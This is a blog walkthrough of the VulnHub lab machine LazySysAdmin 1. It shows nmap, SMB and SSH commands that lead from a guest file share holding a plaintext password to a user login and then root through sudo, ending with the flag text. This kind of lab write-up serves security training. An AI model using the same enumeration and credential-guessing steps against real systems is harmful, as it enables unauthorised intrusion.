---
title: "VulnHub - LazySysAdmin1 Walkthrough"
date: 2020-10-1
tags: [vulnhub, walkthrough]
header:
  image: "/images/lazysysadmin1-thumbnail.jpg"
excerpt: "Walkthroughs"
---

# VulnHub- LazySysAdmin 1 Walkthrough


Hello, everyone. Today I will share the Boot to Root process in the LazySysAdmin 1 vulnerable machine. I will share only the successful way. There will not be a lot of information.

## Information Gathering

We are starting with a **Nmap scan** to find open ports and services.

```
root@kali:~/LazySysAdmin# nmap -p- -T4 -A lazysysadmin.local  
...  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)  
..  
80/tcp open http Apache httpd 2.4.7 ((Ubuntu))  
|_http-generator: Silex v2.2.7  
| http-robots.txt: 4 disallowed entries  
|_/old/ /test/ /TR2/ /Backnode_files/  
|_http-server-header: Apache/2.4.7 (Ubuntu)  
|_http-title: Backnode  
139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)  
3306/tcp open mysql MySQL (unauthorized)  
6667/tcp open irc InspIRCd  
...
|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>,
...
| smb-security-mode:  
| account_used: guest  
| authentication_level: user  
...
```


## Enumeration
We will see that there are a lot of open ports. I will start first HTTP enumeration. I will go to the website. There is not anything special on code or on the interface of the website. Then I forward to source code. Also, again I cannot find anything valuable.

I will see from Nmap scanning that there is `robots.txt` file. So I open this location. There is some text.
```
User-agent: *  
Disallow: /old/  
Disallow: /test/  
Disallow: /TR2/  
Disallow: /Backnode_files/
```

I will try to enter `/old/` and `/test/` directories. Both of them are empty. I will try the other two. Again I don't find anything different.

Next, I am use **`searchsploit`** to look for a vulnerability in Apache/2.4.7, but there is not any.

I move forward. From Nmap scanning result I know that  I can open SMB session with `guest` privileges. So I try it.
```
root@kali:~/LazySysAdmin# smbclient -L //lazysysadmin.local//  
Enter WORKGROUP\root's password: password
  
Sharename Type Comment  
--------- ---- -------  
print$ Disk Printer Drivers  
share$ Disk Sumshare  
IPC$ IPC IPC Service (Web server)  
Reconnecting with SMB1 for workgroup listing.  
```

I saw that there is a `share` folder. I forward it.
```
root@kali:~/LazySysAdmin# smbclient //lazysysadmin.local/share$  
Enter WORKGROUP\root's password: password 
Try "help" to get a list of possible commands.  
smb: \> dir  
. D 0 Tue Aug 15 15:05:52 2017  
.. D 0 Mon Aug 14 16:34:47 2017  
wordpress D 0 Tue Aug 15 15:21:08 2017  
Backnode_files D 0 Mon Aug 14 16:08:26 2017  
wp D 0 Tue Aug 15 14:51:23 2017  
deets.txt N 139 Mon Aug 14 16:20:05 2017  
robots.txt N 92 Mon Aug 14 16:36:14 2017  
todolist.txt N 79 Mon Aug 14 16:39:56 2017  
apache D 0 Mon Aug 14 16:35:19 2017  
index.html N 36072 Sun Aug 6 09:02:15 2017  
info.php N 20 Tue Aug 15 14:55:19 2017  
test D 0 Mon Aug 14 16:35:10 2017  
old D 0 Mon Aug 14 16:35:13 2017  

smb: \> get deets.txt    
...
smb: \> get todolist.txt  
... 
smb: \> cd wordpress\  
smb: \wordpress\>
```

Then I find some files which I think that are interesting. I download `deets.txt`,  `todolist.txt` and I move forward to `wordpress` folder.
From these text files I learn that Web Server is shared with the guests and there is a password - `12345` which is  belong to one of the accounts in the victim.
Also I learnt that there is a `wordpress` website too. I open `lazysysadmin.local/wordpress/` location.
I saw that there is a post and it says that "his/her name is togie". Also the post was shared by `Admin`. 

## Exploit
I try to create an SSH session with this information
```
root@kali:~/LazySysAdmin# ssh admin@lazysysadmin.local  
...
admin@lazysysadmin.local's password:  12345
Permission denied, please try again.  
...
root@kali:~/LazySysAdmin# ssh lazysysadmin@lazysysadmin.local  
...
lazysysadmin@lazysysadmin.local's password:  12345
Permission denied, please try again.  
...
root@kali:~/LazySysAdmin# ssh togie@lazysysadmin.local  
...
togie@lazysysadmin.local's password: 12345  
...
togie@LazySysAdmin:~$
```

Bingo! We gain shell access!

## Privilege Escalation
We see that `togie` has all the privileges, so I don't to do extra enumeration to get `root` access.
``` 
togie@LazySysAdmin:~$ sudo -l  
[sudo] password for togie: 12345 
...
User togie may run the following commands on LazySysAdmin:  
(ALL : ALL) ALL  
togie@LazySysAdmin:~$ sudo su root  
root@LazySysAdmin:/home/togie# cd /root/  
root@LazySysAdmin:~# ls  
proof.txt  
root@LazySysAdmin:~# cat proof.txt  
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851  
  
  
Well done :)  
  
Hope you learn't a few things along the way.  
  
Regards,  
  
Togie Mcdogie  
  
  
  
  
Enjoy some random strings  
  
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851  
2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7  
pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02  
bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu  
root@LazySysAdmin:~#
```
Victory! We did it. Thank you for reading.